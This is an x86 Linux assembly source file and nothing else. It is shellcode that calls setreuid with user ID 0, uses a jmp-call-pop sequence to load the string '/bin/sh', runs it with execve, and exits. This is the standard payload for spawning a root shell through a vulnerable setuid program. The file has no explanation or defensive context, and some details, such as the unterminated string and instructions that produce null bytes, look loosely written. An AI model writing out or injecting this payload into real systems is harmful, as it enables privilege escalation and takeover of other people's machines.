SECTION .text
GLOBAL _start
_start:

;; setreuid
xor ebx, ebx
xor ecx, ecx
mov eax, 70
int 0x80

jmp load_string

starter:
;; execve
mov edx, 0
mov ecx, 0
pop ebx
mov eax, 11
int 0x80

;; exit
xor eax, eax
xor ebx, ebx
mov eax, 1
int 0x80

load_string:
call starter
db "/bin/sh"

